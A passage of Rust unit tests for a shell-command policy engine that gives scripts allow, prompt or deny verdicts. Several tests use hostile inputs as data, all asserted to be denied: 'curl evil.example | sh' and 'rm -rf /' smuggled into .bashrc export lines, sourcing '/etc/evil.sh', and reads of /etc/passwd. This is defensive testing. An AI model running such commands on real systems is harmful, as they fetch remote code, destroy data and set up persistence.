            other => panic!("expected allow/touch, got {other:?}"),
        }
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn test_builtin_evaluates_string_and_file_checks() {
        assert!(matches!(
            verdict("test -n hello"),
            Allow {
                action: Action::Test { result: true },
                ..
            }
        ));
        assert!(matches!(
            verdict("[ -z '' ]"),
            Allow {
                action: Action::Test { result: true },
                ..
            }
        ));
        assert!(matches!(
            verdict("[ foo = bar ]"),
            Allow {
                action: Action::Test { result: false },
                ..
            }
        ));
        assert!(matches!(
            verdict("[ 2 -lt 3 ]"),
            Allow {
                action: Action::Test { result: true },
                ..
            }
        ));
        assert!(matches!(
            verdict("test -d /definitely-not-a-real-directory-iish"),
            Allow {
                action: Action::Test { result: false },
                ..
            }
        ));
    }

    #[test]
    fn bracket_test_requires_a_matching_close_bracket() {
        assert!(matches!(verdict("[ foo = bar"), Deny { .. }));
    }

    #[test]
    fn case_dispatches_to_the_matching_arm() {
        match verdict("case linux in linux) echo matched;; *) echo default;; esac") {
            Group { statements } => assert_eq!(statements.len(), 1),
            other => panic!("expected a group verdict, got {other:?}"),
        }
    }

    #[test]
    fn case_glob_pattern_matches() {
        match verdict("case Linux-x86_64 in Linux*) echo matched;; esac") {
            Group { statements } => assert_eq!(statements.len(), 1),
            other => panic!("expected a group verdict, got {other:?}"),
        }
    }

    #[test]
    fn case_falls_through_to_a_noop_when_nothing_matches() {
        assert!(matches!(
            verdict("case linux in darwin) echo no;; esac"),
            Allow {
                action: Action::Noop,
                ..
            }
        ));
    }

    #[test]
    fn case_fallthrough_post_action_is_not_implemented() {
        assert!(matches!(
            verdict("case linux in linux) echo a;& darwin) echo b;; esac"),
            Deny { .. }
        ));
    }

    #[test]
    fn command_list_produces_an_and_or_list_verdict() {
        match verdict("mkdir /tmp/a && mkdir /tmp/b") {
            Verdict::AndOrList { rest, .. } => assert_eq!(rest.len(), 1),
            other => panic!("expected an and/or list verdict, got {other:?}"),
        }
    }

    #[test]
    fn bare_assignment_of_a_literal_value_is_allowed() {
        match verdict(r#"FOO="bar""#) {
            Allow {
                action: Action::Assign { assignments },
                ..
            } => assert_eq!(assignments, vec![("FOO".to_string(), "bar".to_string())]),
            other => panic!("expected allow/assign, got {other:?}"),
        }
    }

    #[test]
    fn bare_assignment_supports_multiple_variables_on_one_line() {
        match verdict("A=1 B=2") {
            Allow {
                action: Action::Assign { assignments },
                ..
            } => assert_eq!(
                assignments,
                vec![
                    ("A".to_string(), "1".to_string()),
                    ("B".to_string(), "2".to_string())
                ]
            ),
            other => panic!("expected allow/assign, got {other:?}"),
        }
    }

    #[test]
    fn bare_assignment_of_a_refused_substitution_is_denied() {
        // The test harness's substituter refuses; in a real run this
        // would execute `uname -s` and capture its output.
        assert!(matches!(verdict("FOO=$(uname -s)"), Deny { .. }));
    }

    #[test]
    fn bare_assignment_can_be_read_back_by_a_later_statement() {
        let mut session = Session::new();
        let assign = verdict("FOO=bar");
        let Allow {
            action: Action::Assign { assignments },
            ..
        } = assign
        else {
            panic!("expected allow/assign");
        };
        for (name, value) in assignments {
            session.set_variable(name, value);
        }
        match verdict_with("echo $FOO", &mut session) {
            Allow {
                action: Action::Print { text, .. },
                ..
            } => assert_eq!(text, "bar\n"),
            other => panic!("expected allow/print, got {other:?}"),
        }
    }

    #[test]
    fn prefix_assignment_before_a_command_is_still_denied() {
        assert!(matches!(verdict("FOO=bar echo hi"), Deny { .. }));
    }

    #[test]
    fn appending_assignment_is_not_implemented() {
        assert!(matches!(verdict("FOO+=bar"), Deny { .. }));
    }

    #[test]
    fn denies_background_jobs() {
        assert!(matches!(verdict("echo hi &"), Deny { .. }));
    }

    fn home_rc(name: &str) -> String {
        let home = std::env::var("HOME").expect("test environment should have $HOME set");
        format!("{home}/{name}")
    }

    #[test]
    fn env_file_append_prompts_for_export_line() {
        let rc = home_rc(".bashrc");
        let script = format!("echo 'export PATH=\"/opt/tool/bin:$PATH\"' >> {rc}");
        match verdict(&script) {
            Prompt {
                action: Action::AppendFile { path, text },
                ..
            } => {
                assert_eq!(path, PathBuf::from(&rc));
                assert_eq!(text, "export PATH=\"/opt/tool/bin:$PATH\"\n");
            }
            other => panic!("expected prompt/append, got {other:?}"),
        }
    }

    #[test]
    fn env_file_append_prompts_for_bare_path_assignment() {
        let rc = home_rc(".zshrc");
        match verdict(&format!("echo 'PATH=/opt/tool/bin:$PATH' >> {rc}")) {
            Prompt {
                action: Action::AppendFile { .. },
                ..
            } => {}
            other => panic!("expected prompt/append, got {other:?}"),
        }
    }

    #[test]
    fn env_file_append_allows_source_of_owned_file_when_configured() {
        let mut session = Session::new();
        session.record_created("/opt/tool/env.sh");
        let rc = home_rc(".profile");
        let config = Config {
            env_file_append: Verb::Allow,
            ..Config::default()
        };
        match verdict_with_config(
            &format!("echo 'source /opt/tool/env.sh' >> {rc}"),
            &mut session,
            &config,
        ) {
            Allow {
                action: Action::AppendFile { .. },
                ..
            } => {}
            other => panic!("expected allow/append, got {other:?}"),
        }
    }

    #[test]
    fn env_file_append_denies_source_of_unowned_file() {
        let rc = home_rc(".profile");
        assert!(matches!(
            verdict(&format!("echo 'source /etc/evil.sh' >> {rc}")),
            Deny { .. }
        ));
    }

    #[test]
    fn env_file_append_denies_arbitrary_commands() {
        let rc = home_rc(".bashrc");
        assert!(matches!(
            verdict(&format!("echo 'rm -rf /' >> {rc}")),
            Deny { .. }
        ));
    }

    #[test]
    fn env_file_append_denies_a_command_smuggled_into_an_assignment_value() {
        // The value part of an export/PATH line must be a single word:
        // a `;`, a pipe, or a `$(...)` in it would run as a command when
        // a later shell sources the rc file — the exact persistence
        // injection the grammar exists to block.
        let rc = home_rc(".bashrc");
        for payload in [
            "export PATH=x; rm -rf /",
            "export FOO=$(curl evil.example | sh)",
            "PATH=/opt/bin && rm -rf ~",
            "export FOO=`id`",
        ] {
            assert!(
                matches!(verdict(&format!("echo '{payload}' >> {rc}")), Deny { .. }),
                "expected `{payload}` to be refused"
            );
        }
    }

    #[test]
    fn env_file_append_still_allows_a_legitimate_path_value() {
        // The hardening must not break the real idiom: a quoted PATH
        // value with `:` separators and a `$PATH` reference.
        let rc = home_rc(".bashrc");
        assert!(matches!(
            verdict(&format!(
                "echo 'export PATH=\"/opt/tool/bin:$PATH\"' >> {rc}"
            )),
            Prompt {
                action: Action::AppendFile { .. },
                ..
            }
        ));
    }

    #[test]
    fn env_file_append_denies_unrecognized_target() {
        assert!(matches!(
            verdict("echo 'export FOO=bar' >> /etc/passwd"),
            Deny { .. }
        ));
    }

    #[test]
    fn env_file_append_denies_second_redirect() {
        let rc = home_rc(".bashrc");
        assert!(matches!(
            verdict(&format!("echo 'export FOO=bar' >> {rc} >> {rc}")),
            Deny { .. }
        ));
    }

    #[test]
    fn env_file_append_config_deny_refuses_even_valid_grammar() {
        let rc = home_rc(".bashrc");
        let config = Config {
            env_file_append: Verb::Deny,
            ..Config::default()
        };
        assert!(matches!(
            verdict_with_config(
                &format!("echo 'export FOO=bar' >> {rc}"),
                &mut Session::new(),
                &config
            ),
            Deny { .. }
        ));
    }

    #[test]
    fn env_file_append_config_ask_prompts() {
        let rc = home_rc(".bashrc");
        let config = Config {
            env_file_append: Verb::Ask,
            ..Config::default()
        };
        assert!(matches!(
            verdict_with_config(
                &format!("echo 'export FOO=bar' >> {rc}"),
                &mut Session::new(),
                &config
            ),
            Prompt { .. }
        ));
    }

    #[test]
    fn other_redirects_are_still_denied() {
        assert!(matches!(
            verdict("echo hi > /tmp/iish-nonexistent"),
            Deny { .. }
        ));
        assert!(matches!(verdict("mkdir /tmp/a 2> /tmp/err"), Deny { .. }));
        assert!(matches!(verdict("uname -a 2> /tmp/err.log"), Deny { .. }));
        assert!(matches!(verdict("uname -a 2>> /dev/null"), Deny { .. }));
    }

    #[test]
    fn stderr_to_dev_null_is_recognized_on_a_subprocess() {
        match verdict("uname -a 2> /dev/null") {
            Prompt {
                action:
                    Action::Subprocess {
                        name, args, stderr, ..
                    },
                ..
            } => {
                assert_eq!(name, "uname");
                assert_eq!(args, vec!["-a"]);
                assert_eq!(
                    stderr,
                    StderrDest::Null,
                    "2> /dev/null must reach the subprocess"
                );
            }
            other => panic!("expected prompt/subprocess, got {other:?}"),
        }
    }

    #[test]
    fn stdout_and_duplicate_redirects_are_recognized() {
        match verdict("uname -a > /dev/null 2>&1") {
            Prompt {
                action: Action::Subprocess { stdout, stderr, .. },
                ..
            } => {
                assert_eq!(stdout, StdoutDest::Null);
                assert_eq!(stderr, StderrDest::Stdout);
            }
            other => panic!("expected prompt/subprocess, got {other:?}"),
        }
        match verdict("echo warn >&2") {
            Allow {
                action:
                    Action::Print {
                        dest: StdoutDest::Stderr,
                        ..
                    },
                ..
            } => {}
            other => panic!("expected allow/print-to-stderr, got {other:?}"),
        }
    }

    #[test]
    fn stderr_to_dev_null_is_recognized_on_a_native_command() {
        // Natives never write the script's output to stderr, so the
        // redirect is satisfied by doing nothing — the point is only
        // that its presence must not deny an otherwise fine statement.
        match verdict("echo hi 2> /dev/null") {
            Allow {
                action: Action::Print { text, .. },
                ..
            } => assert_eq!(text, "hi\n"),
            other => panic!("expected allow/print, got {other:?}"),
        }
    }

    #[test]
    fn sha256sum_compute_denies_unowned_file() {
        assert!(matches!(verdict("sha256sum /etc/passwd"), Deny { .. }));
    }

    #[test]
    fn sha256sum_compute_allows_owned_file() {
        let mut session = Session::new();
        session.record_created("/tmp/iish-nonexistent-dl/tool.tar.gz");
        match verdict_with(
            "sha256sum /tmp/iish-nonexistent-dl/tool.tar.gz",
            &mut session,
        ) {
            Allow {
                action: Action::Sha256Sum { paths },
                ..
            } => assert_eq!(
                paths,
                vec![PathBuf::from("/tmp/iish-nonexistent-dl/tool.tar.gz")]
            ),
            other => panic!("expected allow/sha256sum, got {other:?}"),
        }
    }

    #[test]
    fn sha256sum_check_denies_unowned_checksums_file() {
        assert!(matches!(
            verdict("sha256sum -c /etc/checksums.txt"),
            Deny { .. }
        ));
    }

    #[test]
    fn sha256sum_check_allows_owned_checklist_with_owned_entries() {
        let dir = std::env::temp_dir().join(format!("iish-policy-sha256-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let target = dir.join("tool.bin");
        let checklist = dir.join("tool.bin.sha256");
        std::fs::write(&target, b"payload").unwrap();
        std::fs::write(
            &checklist,
            format!(
                "{}  {}\n",
                "239f59ed55e737c77147cf55ad0c1b030b6d7ee748a7426952f9b852d5a935e5",
                target.display()
            ),
        )
        .unwrap();
        let mut session = Session::new();
        session.record_created(&checklist);
        session.record_created(&target);

        match verdict_with(
            &format!("sha256sum -c {}", checklist.display()),
            &mut session,
        ) {
            Allow {
                action: Action::Sha256Check { entries },
                ..
            } => {
                assert_eq!(entries.len(), 1);
                assert_eq!(entries[0].1, target);
            }
            other => panic!("expected allow/sha256check, got {other:?}"),
        }
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn sha256sum_check_denies_unowned_entry_path() {
        let dir =
            std::env::temp_dir().join(format!("iish-policy-sha256-foreign-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let checklist = dir.join("checksums.txt");
        std::fs::write(&checklist, format!("{}  /etc/passwd\n", "0".repeat(64))).unwrap();
        let mut session = Session::new();
        session.record_created(&checklist);

        assert!(matches!(
            verdict_with(
                &format!("sha256sum -c {}", checklist.display()),
                &mut session
            ),
            Deny { .. }
        ));
        std::fs::remove_dir_all(&dir).unwrap();
    }

    fn scratch_dir(name: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("iish-policy-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn cp_to_new_destination_is_allowed() {
        let dir = scratch_dir("cp-new");
        let src = dir.join("src.txt");
        std::fs::write(&src, b"payload").unwrap();
        match verdict(&format!(
            "cp {} {}",
            src.display(),
            dir.join("dest.txt").display()
        )) {
            Allow {
                action: Action::Copy { pairs, recursive },
                ..
            } => {
                assert!(!recursive);
                assert_eq!(pairs, vec![(src.clone(), dir.join("dest.txt"))]);
            }
            other => panic!("expected allow/copy, got {other:?}"),
        }
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn cp_overwriting_a_foreign_file_prompts() {
        let dir = scratch_dir("cp-overwrite");
        let src = dir.join("src.txt");
        let dest = dir.join("dest.txt");
        std::fs::write(&src, b"new").unwrap();
        std::fs::write(&dest, b"old").unwrap();
        assert!(matches!(
            verdict(&format!("cp {} {}", src.display(), dest.display())),
            Prompt {
                action: Action::Copy { .. },
                ..
            }
        ));
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn cp_overwriting_an_owned_file_is_allowed() {
        let dir = scratch_dir("cp-overwrite-owned");
        let src = dir.join("src.txt");
        let dest = dir.join("dest.txt");
        std::fs::write(&src, b"new").unwrap();
        std::fs::write(&dest, b"old").unwrap();
        let mut session = Session::new();
        session.record_created(&dest);
        assert!(matches!(
            verdict_with(
                &format!("cp {} {}", src.display(), dest.display()),
                &mut session
            ),
            Allow {
                action: Action::Copy { .. },
                ..
            }
        ));
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn cp_denies_missing_source() {
        assert!(matches!(
            verdict("cp /tmp/iish-nonexistent-source.txt /tmp/iish-dest.txt"),
            Deny { .. }
        ));
    }

    #[test]
    fn cp_denies_directory_without_recursive() {
        let dir = scratch_dir("cp-dir-no-r");
        let src_dir = dir.join("src");
        std::fs::create_dir_all(&src_dir).unwrap();
        assert!(matches!(
            verdict(&format!(
                "cp {} {}",
                src_dir.display(),
                dir.join("dest").display()
            )),
            Deny { .. }
        ));
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn cp_recursive_of_directory_is_allowed() {
        let dir = scratch_dir("cp-dir-r");
        let src_dir = dir.join("src");
        std::fs::create_dir_all(&src_dir).unwrap();
        match verdict(&format!(
            "cp -r {} {}",
            src_dir.display(),
            dir.join("dest").display()
        )) {
            Allow {
                action: Action::Copy { recursive, .. },
                ..
            } => assert!(recursive),
            other => panic!("expected allow/copy, got {other:?}"),
        }
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn set_known_flags_are_allowed() {
        for line in ["set -e", "set -eu", "set +x", "set -o pipefail", "set -o"] {
            assert!(
                matches!(verdict(line), Allow { .. }),
                "expected `{line}` to be allowed"
            );
        }
    }

    #[test]
    fn set_unknown_flag_is_denied() {
        assert!(matches!(verdict("set -k"), Deny { .. }));
        assert!(matches!(verdict("set -o nonexistent-option"), Deny { .. }));
    }

    #[test]
    fn set_double_dash_is_denied() {
        assert!(matches!(verdict("set -- a b c"), Deny { .. }));
    }

    #[test]
    fn function_definition_is_allowed_and_registers_nothing_until_called() {
        match verdict("greet() { echo hi; }") {
            Allow {
                action: Action::DefineFunction { name, body },
                ..
            } => {
                assert_eq!(name, "greet");
                assert_eq!(body.0.len(), 1);
            }
            other => panic!("expected allow/define-function, got {other:?}"),
        }
    }

    #[test]
    fn function_body_that_is_not_a_brace_group_is_denied() {
        assert!(matches!(verdict("greet() ( echo hi )"), Deny { .. }));
    }

    #[test]
    fn top_level_brace_group_produces_a_group_verdict() {
        match verdict("{ echo hi; echo bye; }") {
            Group { statements } => assert_eq!(statements.len(), 2),
            other => panic!("expected a group verdict, got {other:?}"),
        }
    }

    fn define_greet(session: &mut Session) {
        let def_verdict = verdict("greet() { echo hi; echo bye; }");
        let Allow {
            action: Action::DefineFunction { body, .. },
            ..
        } = def_verdict
        else {
            panic!("expected the definition to compile to DefineFunction");
        };
        session.define_function("greet", body);
    }

    #[test]
    fn calling_a_defined_function_produces_a_call_verdict_with_args() {
        let mut session = Session::new();
        define_greet(&mut session);
        match verdict_with("greet one 'two words'", &mut session) {
            Call { name, args, body } => {
                assert_eq!(name, "greet");
                assert_eq!(args, vec!["one", "two words"]);
                assert_eq!(body.len(), 2);
            }
            other => panic!("expected a call verdict, got {other:?}"),
        }
    }

    #[test]
    fn command_builtin_skips_function_lookup() {
        let mut session = Session::new();
        define_greet(&mut session);
        // `command greet` must NOT dispatch to the function; with no
        // native/`$PATH` implementation of `greet`, it lands in the
        // subprocess (ask) tier.
        assert!(matches!(
            verdict_with("command greet", &mut session),
            Prompt {
                action: Action::Subprocess { .. },
                ..
            }
        ));
    }

    #[test]
    fn command_v_compiles_to_a_lookup() {
        match verdict("command -v git") {
            Allow {
                action:
                    Action::CommandLookup {
                        name,
                        style: LookupStyle::CommandV,
                        ..
                    },
                ..
            } => assert_eq!(name, "git"),
            other => panic!("expected allow/lookup, got {other:?}"),
        }
    }

    #[test]
    fn type_compiles_to_a_lookup() {
        match verdict("type curl") {
            Allow {
                action:
                    Action::CommandLookup {
                        name,
                        style: LookupStyle::Type,
                        ..
                    },
                ..
            } => assert_eq!(name, "curl"),
            other => panic!("expected allow/lookup, got {other:?}"),
        }
    }

    #[test]
    fn local_inside_a_function_is_allowed() {
        let mut session = Session::new();
        session.push_frame("f", vec![]);
        match verdict_with("local x=1 name", &mut session) {
            Allow {
                action: Action::DeclareLocal { assignments },
                ..
            } => {
                // Both are declared; plain names are collected before
                // `NAME=value` assignment words (order is irrelevant for
                // `local`, which declares each independently).
                assert!(assignments.contains(&("x".to_string(), "1".to_string())));
                assert!(assignments.contains(&("name".to_string(), String::new())));
                assert_eq!(assignments.len(), 2);
            }
            other => panic!("expected allow/declare-local, got {other:?}"),
        }
    }

    #[test]
    fn local_outside_a_function_is_denied() {
        match verdict("local x=1") {
            Deny { reason } => assert!(reason.contains("outside a function"), "{reason}"),
            other => panic!("expected deny, got {other:?}"),
        }
    }

    #[test]
    fn unset_compiles_variables_and_functions() {
        match verdict("unset FOO BAR") {
            Allow {
                action:
                    Action::Unset {
                        names,
                        functions: false,
                    },
                ..
            } => assert_eq!(names, vec!["FOO", "BAR"]),
            other => panic!("expected allow/unset, got {other:?}"),
        }
        assert!(matches!(
            verdict("unset -f helper"),
            Allow {
                action: Action::Unset {
                    functions: true,
                    ..
                },
                ..
            }
        ));
    }

    #[test]
    fn shift_compiles() {
        assert!(matches!(
            verdict("shift"),
            Allow {
                action: Action::Shift { n: 1 },
                ..
            }
        ));
        assert!(matches!(
            verdict("shift 2"),
            Allow {
                action: Action::Shift { n: 2 },
                ..
            }
        ));
        assert!(matches!(verdict("shift x"), Deny { .. }));
    }

    #[test]
    fn return_requires_a_function_and_exit_does_not() {
        assert!(matches!(verdict("return 1"), Deny { .. }));
        let mut session = Session::new();
        session.push_frame("f", vec![]);
        assert!(matches!(
            verdict_with("return 1", &mut session),
            Verdict::ControlFlow(Flow::Return(1))
        ));
        assert!(matches!(
            verdict("exit 3"),
            Verdict::ControlFlow(Flow::Exit(3))
        ));
        assert!(matches!(
            verdict("break"),
            Verdict::ControlFlow(Flow::Break(1))
        ));
        assert!(matches!(
            verdict("continue 2"),
            Verdict::ControlFlow(Flow::Continue(2))
        ));
    }

    #[test]
    fn function_args_expand_at_and_star_by_field() {
        let mut session = Session::new();
        define_greet(&mut session);
        session.push_frame("outer", vec!["a".into(), "b c".into()]);
        match verdict_with("greet \"$@\"", &mut session) {
            Call { args, .. } => assert_eq!(args, vec!["a", "b c"]),
            other => panic!("expected a call verdict, got {other:?}"),
        }
    }
}
